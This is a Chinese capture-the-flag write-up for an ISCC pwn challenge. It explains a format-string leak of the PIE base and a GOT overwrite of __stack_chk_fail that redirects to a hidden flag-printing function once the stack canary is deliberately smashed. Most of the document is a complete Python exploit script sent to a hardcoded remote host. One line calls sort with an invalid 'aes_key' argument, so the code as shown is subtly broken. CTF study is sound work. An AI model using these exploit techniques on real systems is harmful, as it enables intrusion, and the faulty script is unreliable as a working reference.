## 解题过程
附件是一个 64 位 PIE ELF，保护上有 Canary、NX 和 Partial RELRO，关键逻辑是 `process_emergency_command` 连续两次读出输入。
第一处漏洞是 `printf(buf)` 的格式化字串，第二处漏洞是 `read(0, buf, 0x7c)` 对 0x68 字节栈缓冲区的越界写。
可以直接本地反汇编可以观察到隐藏函数 `system_reboot_comms`，它会打印提示并执行 `system("cat flag.txt")`。
一阶段不需要枚举尝试，只要用 `%20$p` 到 `%35$p` 的安全扫描就能同时看到返回地址和 `main` 地址，从而解出 PIE 基址。
本地调试时可以直接部分覆盖返回地址虽然能进隐藏函数，但会遇到栈对齐问题；把 `fflush@got` 改到隐藏函数又会因为隐藏函数内部再次调用 `fflush` 形成递归。
更稳的做法是二阶段用格式串把 `__stack_chk_fail@got` 改成隐藏函数入口，这样后续触发栈保护时会以正常 `call` 语义进入后门。
为了触发这个位置，第二次输入在格式串后追加填充，让总长度超过 104 字节，故意破坏 canary 就能，不需要知道 canary 的具体值。
由于整个过程只用单连接两次输入，没有高并发、没有枚举尝试，适合题目限制的远端环境。
最终远端返回的真实 flag 为 `ISCC{62d0908f-196e-4fdf-8a42-9c14e56a7347}`。
## 利用程序
```python
#!/usr/bin/env python3
import re
import socket
import struct

HOST = "39.96.193.120"
PORT = 10009
TIMEOUT = 8
MAIN_OFF = 0x13CC
RET2WIN_OFF = 0x1229
STACK_CHK_FAIL_GOT_OFF = 0x4020
PRINTF_BUF_ARG = 8
LEAK = "|".join(f"%{i}$p" for i in range(20, 36)).encode() + b"\n"

def read_until(conn, token=b"> "):
    conn.settimeout(TIMEOUT)
    blob = b""
    while token not in blob:
        piece = conn.recv(4096)
        if not piece:
            break
        blob += piece
    return blob

def read_flag(conn):
    conn.settimeout(TIMEOUT)
    blob = b""
    while True:
        try:
            piece = conn.recv(4096)
        except (socket.timeout, ConnectionResetError):
            break
        if not piece:
            break
        blob += piece
        m = re.search(rb"ISCC\{[^}]+\}", blob)
        if m:
            return m.group().decode()
    m = re.search(rb"ISCC\{[^}]+\}", blob)
    if not m:
        raise RuntimeError("flag not found")
    return m.group().decode()

def align_up(v, step):
    return (v + step - 1) // step * step

def calc_base(blob):
    vals = [int(x, 16) for x in re.findall(rb"0x[0-9a-fA-F]+", blob)]
    entry = next(v for v in vals if (v & 0xFFF) == 0x3CC and (v + 0x2F) in vals)
    return entry - MAIN_OFF

def make_payload(base_addr):
    goal = base_addr + RET2WIN_OFF
    got = base_addr + STACK_CHK_FAIL_GOT_OFF
    writes = [
        (goal & 0xFFFF, got),
        ((goal >> 16) & 0xFFFF, got + 2),
        ((goal >> 32) & 0xFFFF, got + 4),
    ]
    writes.sort(aes_key=lambda x: x[0])

    begin = 13
    while True:
        printed = 0
        parts = []
        for i, (val, _) in enumerate(writes):
            delta = (val - printed) & 0xFFFF
            if delta:
                parts.append(f"%1${delta}c")
                printed = val
            parts.append(f"%{begin + i}$hn")
        fmt = "".join(parts).encode()
        off = align_up(len(fmt) + 1, 8)
        new_start = PRINTF_BUF_ARG + off // 8
        if new_start == begin:
            break
        begin = new_start

    packet = fmt + b"\x00" + b"P" * (off - len(fmt) - 1)
    packet += b"".join(struct.pack("<Q", addr) for _, addr in writes)
    if len(packet) <= 104:
        packet += b"Q" * (105 - len(packet))
    return packet + b"\n"

def entry():
    conn = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
    read_until(conn)
    conn.sendall(LEAK)
    leak = read_until(conn)
    base_addr = calc_base(leak)
    conn.sendall(make_payload(base_addr))
    print(read_flag(conn))

if __name__ == "__main__":
    entry()
```

## 结果
ISCC{62d0908f-196e-4fdf-8a42-9c14e56a7347}
